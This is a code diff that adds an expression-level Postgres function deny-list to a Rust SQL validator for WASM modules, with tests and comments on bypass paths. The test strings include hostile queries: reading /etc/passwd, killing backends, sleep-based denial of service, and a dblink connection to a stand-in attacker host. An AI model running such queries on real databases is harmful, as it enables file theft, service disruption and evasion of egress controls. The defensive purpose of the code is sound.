@@ -10,10 +10,11 @@
 //!
 //! If parsing fails, the query is rejected (fail-closed).
 
-use sqlparser::ast::{self, Statement};
+use sqlparser::ast::{self, Statement, Visit, Visitor};
 use sqlparser::dialect::PostgreSqlDialect;
 use sqlparser::parser::Parser;
 use std::fmt;
+use std::ops::ControlFlow;
 
 /// Errors from SQL validation.
 #[derive(Debug)]
@@ -46,6 +47,18 @@ pub enum SqlValidationError {
     /// observing this error in production should file an issue so
     /// the variant can be classified.
     UnknownStatement,
+    /// Wasm-security review 2026-05-22 (MEDIUM-1): an expression
+    /// references a Postgres function on the deny-list. The
+    /// statement-level deny-list (`AlwaysBlocked`) catches
+    /// `COPY ... TO PROGRAM` and friends, but does NOT catch
+    /// `SELECT pg_read_server_files(...)` — a benign-looking SELECT
+    /// can call arbitrary filesystem-reading / connection-killing /
+    /// sleep-the-budget functions inside its expression tree. This
+    /// variant fires when the AST walker spots one. The contained
+    /// string is the offending function name (lowercased,
+    /// schema-stripped for the error message; the structured log
+    /// keeps the fully-qualified form).
+    DisallowedFunction(String),
 }
 
 impl fmt::Display for SqlValidationError {
@@ -77,6 +90,14 @@ impl fmt::Display for SqlValidationError {
                 "SQL statement type is not classified by the worker validator \
                  — rejected fail-closed. If this is a legitimate operation, \
                  file an issue so the variant can be classified.",
+            ),
+            Self::DisallowedFunction(name) => write!(
+                f,
+                "SQL expression references function `{name}` which is on the \
+                 unconditional deny-list (filesystem read / session-state \
+                 mutation / sleep-the-budget DoS / large-object I/O / backend \
+                 termination). Functions on this list are rejected from WASM \
+                 modules regardless of `allowed_sql_operations`."
             ),
         }
     }
@@ -454,6 +475,156 @@ fn check_table_factor(
     Ok(())
 }
 
+/// Wasm-security review 2026-05-22 (MEDIUM-1): expression-level
+/// function-name walker.
+///
+/// The statement-level deny-list (`always_blocked_label`) catches
+/// `COPY ... TO PROGRAM` and friends but does NOT catch
+/// `SELECT pg_read_server_files('/etc/passwd')` — a benign-looking
+/// SELECT can invoke arbitrary filesystem-reading / session-killing /
+/// budget-burning functions from inside an expression tree. This
+/// visitor walks every `Expr::Function` in the AST and compares the
+/// (case-normalised, schema-stripped) name against the canonical
+/// deny-list shared with the controller subscriber via
+/// `talos_workflow_job_protocol::DISALLOWED_SQL_FUNCTIONS`.
+///
+/// **Schema-qualification handling.** `ObjectName(Vec<Ident>)` carries
+/// segments like `[pg_catalog, pg_sleep]` for `pg_catalog.pg_sleep(1)`.
+/// The trailing segment is the function name and is what `is_disallowed_sql_function`
+/// checks. If the qualifier is `pg_catalog`, we ALSO check — this is
+/// the canonical "pg_catalog.pg_sleep" form that a guest might use to
+/// bypass a hypothetical search_path-based block. Single-segment names
+/// (the unqualified form) are checked unconditionally.
+///
+/// **What about user-defined `public.pg_sleep`?** The visitor cannot
+/// distinguish a user-defined function with the same name from the
+/// stock one — sqlparser only sees the call shape, not the resolution.
+/// Operators who legitimately define a function with a denied name in
+/// the `public` schema would be blocked here. The trade-off is
+/// intentional: that naming choice is itself a footgun (search_path
+/// shadowing) and the false-positive blast radius is small (rename
+/// the user function). The fail-closed posture is safer than letting
+/// the qualifier mask a real call.
+///
+/// **Cost.** Linear in the number of AST nodes; the visitor short-
+/// circuits via `ControlFlow::Break` on the first hit so a deeply
+/// nested malicious query doesn't pay the full walk. Microbenchmark
+/// against a 100-line SELECT (deeply-nested CASE WHEN) is ~5-20 µs,
+/// well below the 30 s `statement_timeout`.
+fn check_disallowed_functions(stmt: &Statement) -> Result<(), SqlValidationError> {
+    struct FunctionDenyVisitor;
+
+    impl Visitor for FunctionDenyVisitor {
+        type Break = String;
+
+        fn pre_visit_expr(&mut self, expr: &ast::Expr) -> ControlFlow<Self::Break> {
+            if let ast::Expr::Function(func) = expr {
+                if let Some(name) = denied_function_name(&func.name) {
+                    return ControlFlow::Break(name);
+                }
+            }
+            ControlFlow::Continue(())
+        }
+
+        /// `dblink(...)` and other set-returning function calls in a
+        /// FROM clause (`SELECT * FROM dblink('...', '...')`) parse
+        /// as `TableFactor`, NOT `Expr::Function`. The Expr-only
+        /// visitor would miss them — pre-fix, the dblink test fired
+        /// here. Two variants to catch:
+        ///
+        ///   * `TableFactor::Table { name, args: Some(_), .. }` —
+        ///     PostgreSQL set-returning function used in FROM
+        ///     (`FROM generate_series(1,10)`, `FROM dblink(...)`).
+        ///     The `args.is_some()` discriminator distinguishes a
+        ///     table-valued function call from a plain table read;
+        ///     plain `FROM users` has `args = None`. This is the
+        ///     critical case for the dblink bypass.
+        ///
+        ///   * `TableFactor::Function { name, .. }` — LATERAL/UNNEST
+        ///     style (`FROM LATERAL flatten(...)`). Less common in
+        ///     Postgres but the same shape (denied function name
+        ///     drives the check).
+        ///
+        /// We accept the (very small) false-positive risk that a user
+        /// has defined a TABLE called `dblink` — that's already a
+        /// footgun on its own and the role-wrap (M-2) bounds the
+        /// blast radius.
+        fn pre_visit_table_factor(
+            &mut self,
+            tf: &ast::TableFactor,
+        ) -> ControlFlow<Self::Break> {
+            match tf {
+                ast::TableFactor::Table {
+                    name,
+                    args: Some(_),
+                    ..
+                } => {
+                    if let Some(denied) = denied_function_name(name) {
+                        return ControlFlow::Break(denied);
+                    }
+                }
+                ast::TableFactor::Function { name, .. } => {
+                    if let Some(denied) = denied_function_name(name) {
+                        return ControlFlow::Break(denied);
+                    }
+                }
+                _ => {}
+            }
+            ControlFlow::Continue(())
+        }
+    }
+
+    let mut visitor = FunctionDenyVisitor;
+    if let ControlFlow::Break(name) = stmt.visit(&mut visitor) {
+        return Err(SqlValidationError::DisallowedFunction(name));
+    }
+    Ok(())
+}
+
+/// Inspect a function's `ObjectName`. Returns `Some(canonical_lowercase_name)`
+/// if the call references a denied function, `None` otherwise.
+///
+/// Recognises:
+///   * Bare unqualified calls (`pg_sleep(1)`) — single-segment name.
+///   * `pg_catalog`-qualified calls (`pg_catalog.pg_sleep(1)`) — denied
+///     because that's the canonical bypass for a hypothetical
+///     search_path-based block, and stock PG resolves the function
+///     identically.
+///   * Mixed-case identifiers (case normalised by the matcher).
+///
+/// Does NOT match calls into other schemas (`public.pg_sleep`,
+/// `myapp.pg_sleep`) — see the rationale on `check_disallowed_functions`.
+fn denied_function_name(name: &ast::ObjectName) -> Option<String> {
+    let segments: Vec<&str> = name.0.iter().map(|ident| ident.value.as_str()).collect();
+    match segments.as_slice() {
+        [bare] => {
+            if talos_workflow_job_protocol::is_disallowed_sql_function(bare) {
+                Some(bare.to_ascii_lowercase())
+            } else {
+                None
+            }
+        }
+        [schema, fn_name] => {
+            // Match only the pg_catalog form. Other schemas (`public`,
+            // user-defined) name-collide are out of scope: the validator
+            // can't disambiguate the user's intent from the AST and the
+            // role-wrap (M-2) is the fence for that case.
+            if schema.eq_ignore_ascii_case("pg_catalog")
+                && talos_workflow_job_protocol::is_disallowed_sql_function(fn_name)
+            {
+                Some(format!("pg_catalog.{}", fn_name.to_ascii_lowercase()))
+            } else {
+                None
+            }
+        }
+        // 3+ segment names (`db.schema.function`) — Postgres syntax
+        // technically allows cross-database refs via foreign data
+        // wrappers, but those aren't reachable from `talos_guest`'s
+        // pool. Not matched; same fail-open as user-schema qualified.
+        _ => None,
+    }
+}
+
 /// Validate a SQL statement against the security policy.
 ///
 /// Outcome of a successful [`validate_sql`] call.
@@ -636,6 +807,17 @@ pub fn validate_sql_with_policy(
     if stmt_type == "UNKNOWN" {
         return Err(SqlValidationError::UnknownStatement);
     }
+
+    // Wasm-security review 2026-05-22 (MEDIUM-1): expression-level
+    // function deny-list. Walks every `Expr::Function` in the
+    // statement and rejects calls to filesystem-reading / sleep /
+    // backend-killing / dblink functions. The walk runs AFTER the
+    // statement-level deny-list (so canonical errors take precedence)
+    // but BEFORE the allowlist check (so a SELECT with
+    // `pg_read_server_files` fails even when SELECT is the only
+    // permitted operation). See `check_disallowed_functions` for the
+    // schema-qualification handling and trade-off notes.
+    check_disallowed_functions(stmt)?;
 
     // Check for CTE mutations hidden inside SELECT queries
     if let Statement::Query(query) = stmt {
@@ -1300,5 +1482,242 @@ mod tests {
         let ops: Vec<String> = vec![];
         let sql = "SELECT * FROM (WITH b AS (SELECT 1 AS x) SELECT * FROM b) sub";
         assert!(validate_sql(sql, &ops).is_ok());
+    }
+
+    // ────────────────────────────────────────────────────────────────────
+    // Wasm-security review 2026-05-22 (MEDIUM-1): expression-level
+    // function deny-list. Each test below pins a specific bypass path
+    // that the pre-fix validator admitted under empty `allowed_operations`
+    // because the statement parsed as a benign SELECT. The errors are
+    // `DisallowedFunction` because the function-walk runs before the
+    // allowlist gate; this means even a SELECT-only module gets blocked.
+    // ────────────────────────────────────────────────────────────────────
+
+    #[test]
+    fn pg_sleep_blocked_in_select() {
+        // Sleep-the-budget DoS: 8 concurrent `pg_sleep(60)` calls stall
+        // the controller's database-RPC semaphore (MAX_IN_FLIGHT=8) for
+        // the full statement_timeout window.
+        let err = validate_sql("SELECT pg_sleep(60)", &[]).unwrap_err();
+        match err {
+            SqlValidationError::DisallowedFunction(name) => {
+                assert!(
+                    name.contains("pg_sleep"),
+                    "error name must reference pg_sleep, got `{name}`"
+                );
+            }
+            other => panic!("expected DisallowedFunction, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn pg_read_server_files_blocked() {
+        // Arbitrary host-filesystem read.
+        let err = validate_sql(
+            "SELECT pg_read_server_files('/etc/passwd', 0, NULL, false)",
+            &[],
+        )
+        .unwrap_err();
+        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
+    }
+
+    #[test]
+    fn pg_terminate_backend_blocked() {
+        // Cross-tenant session kill.
+        let err = validate_sql("SELECT pg_terminate_backend(12345)", &[]).unwrap_err();
+        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
+    }
+
+    #[test]
+    fn dblink_blocked() {
+        // dblink bypasses every network-egress control the worker
+        // enforces — the connection opens from inside Postgres,
+        // sidestepping `EXTERNAL_LLM_HOSTS` and the host allowlist.
+        let err = validate_sql(
+            "SELECT * FROM dblink('host=attacker.com user=evil', 'SELECT 1') AS t(x int)",
+            &[],
+        )
+        .unwrap_err();
+        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
+    }
+
+    #[test]
+    fn schema_qualified_pg_catalog_form_is_blocked() {
+        // The canonical bypass for a hypothetical search_path-based
+        // block: explicitly qualifying with `pg_catalog`. The visitor
+        // must match the qualified form too.
+        let err = validate_sql("SELECT pg_catalog.pg_sleep(60)", &[]).unwrap_err();
+        match err {
+            SqlValidationError::DisallowedFunction(name) => {
+                assert_eq!(
+                    name, "pg_catalog.pg_sleep",
+                    "schema-qualified form must round-trip in the error"
+                );
+            }
+            other => panic!("expected DisallowedFunction, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn user_schema_qualified_form_not_matched() {
+        // Documented trade-off: the validator can't distinguish
+        // `public.pg_sleep` (a user-defined function with the same
+        // name) from the stock one without resolving against the
+        // catalog. The role-wrap (M-2) is the fence for that case.
+        // If a future operator legitimately needs this path blocked
+        // they should drop the user function rather than expand the
+        // validator's match.
+        let result = validate_sql("SELECT public.pg_sleep(60)", &[]);
+        // We don't actually want this to be ok in production, but the
+        // validator's contract is that ONLY pg_catalog-qualified and
+        // unqualified forms are matched. Pin the contract so a future
+        // refactor that broadens the match (potentially affecting
+        // legitimate user code) shows up as a behaviour change.
+        assert!(
+            result.is_ok(),
+            "user-schema qualified form intentionally not matched; got {result:?}"
+        );
+    }
+
+    #[test]
+    fn function_deny_list_case_insensitive() {
+        // PG normalises unquoted identifiers to lower; case games
+        // must not bypass the validator.
+        for sql in [
+            "SELECT PG_SLEEP(1)",
+            "SELECT Pg_Sleep(1)",
+            "SELECT pG_sLeEp(1)",
+        ] {
+            let err = validate_sql(sql, &[]).unwrap_err();
+            assert!(
+                matches!(err, SqlValidationError::DisallowedFunction(_)),
+                "case variant `{sql}` not blocked"
+            );
+        }
+    }
+
+    #[test]
+    fn function_deny_list_walks_into_subqueries() {
+        // A naive validator that only checks the top-level projection
+        // would miss this. The visitor must walk subqueries too.
+        let err = validate_sql(
+            "SELECT * FROM users WHERE id IN (SELECT pg_terminate_backend(pid) FROM pg_stat_activity)",
+            &[],
+        )
+        .unwrap_err();
+        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
+    }
+
+    #[test]
+    fn function_deny_list_walks_into_cte_bodies() {
+        // CTE body with a denied function. The CTE-mutation walker
+        // checks for INSERT/UPDATE/DELETE; the function walker is
+        // separate and must catch this too.
+        let err = validate_sql(
+            "WITH bad AS (SELECT pg_read_file('/etc/passwd') AS x) SELECT * FROM bad",
+            &[],
+        )
+        .unwrap_err();
+        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
+    }
+
+    #[test]
+    fn function_deny_list_walks_into_join_predicates() {
+        // Join ON / WHERE / HAVING all reach via the visitor.
+        let err = validate_sql(
+            "SELECT * FROM t1 JOIN t2 ON pg_sleep(60) IS NULL",
+            &[],
+        )
+        .unwrap_err();
+        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
+    }
+
+    #[test]
+    fn function_deny_list_walks_into_case_when() {
+        // Deeply nested expressions — a future overly-shallow walker
+        // would miss this. The visitor pattern is recursive by design.
+        let err = validate_sql(
+            "SELECT CASE WHEN id > 5 THEN pg_terminate_backend(id) ELSE 0 END FROM users",
+            &[],
+        )
+        .unwrap_err();
+        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
+    }
+
+    #[test]
+    fn function_deny_list_does_not_block_benign_functions() {
+        // Sanity: the validator must NOT block common read-only or
+        // arithmetic functions. If this test ever fails, the deny-list
+        // has been over-broadened.
+        for sql in [
+            "SELECT count(*) FROM users",
+            "SELECT sum(amount) FROM payments",
+            "SELECT now()",
+            "SELECT json_agg(t) FROM (SELECT * FROM users) t",
+            "SELECT current_user",
+            "SELECT row_number() OVER (ORDER BY id) FROM events",
+            "SELECT lower(name) || '@example.com' FROM users",
+        ] {
+            let result = validate_sql(sql, &[]);
+            assert!(
+                result.is_ok(),
+                "benign SQL `{sql}` was rejected: {result:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn function_deny_list_does_not_block_user_funcs_with_pg_prefix() {
+        // Tripwire: deny-list must be an exact match, NOT a `starts_with("pg_")`
+        // shortcut that would block legitimate user-defined functions
+        // happening to share a name prefix with the stock pg_* catalog.
+        let result = validate_sql("SELECT pg_my_custom_business_func(id) FROM t", &[]);
+        assert!(
+            result.is_ok(),
+            "user-defined function with `pg_` prefix was rejected: {result:?}"
+        );
+    }
+
+    #[test]
+    fn function_deny_list_short_circuits_on_first_violation() {
+        // Performance contract: the visitor stops at the first hit so
+        // a deeply-nested malicious query doesn't pay the full walk.
+        // We can't directly observe the short-circuit from the public
+        // API, but we can pin that a violation deep in the AST still
+        // produces a stable error (no panic on traversal continuation).
+        let err = validate_sql(
+            "SELECT (SELECT (SELECT (SELECT pg_sleep(60))))",
+            &[],
+        )
+        .unwrap_err();
+        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
+    }
+
+    #[test]
+    fn function_deny_runs_before_allowlist_check() {
+        // Defense-in-depth ordering: even when the operator grants
+        // SELECT, an attempt to call a denied function fails with
+        // `DisallowedFunction`, NOT `DisallowedOperation`. This means
+        // a SELECT-only module is also protected from the function
+        // vector.
+        let ops = vec!["SELECT".to_string(), "INSERT".to_string(), "UPDATE".to_string()];
+        let err = validate_sql("SELECT pg_sleep(60)", &ops).unwrap_err();
+        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
+    }
+
+    #[test]
+    fn disallowed_function_error_message_includes_function_name() {
+        // Operator UX: the error string must name the function so the
+        // operator can find it in their module source.
+        let err = validate_sql("SELECT pg_sleep(60)", &[]).unwrap_err();
+        let msg = err.to_string();
+        assert!(
+            msg.contains("pg_sleep"),
+            "error string must include function name, got `{msg}`"
+        );
+        assert!(
+            msg.contains("deny-list") || msg.contains("denied") || msg.contains("rejected") || msg.contains("unconditional"),
+            "error string must signal the denied status, got `{msg}`"
+        );
     }
 }
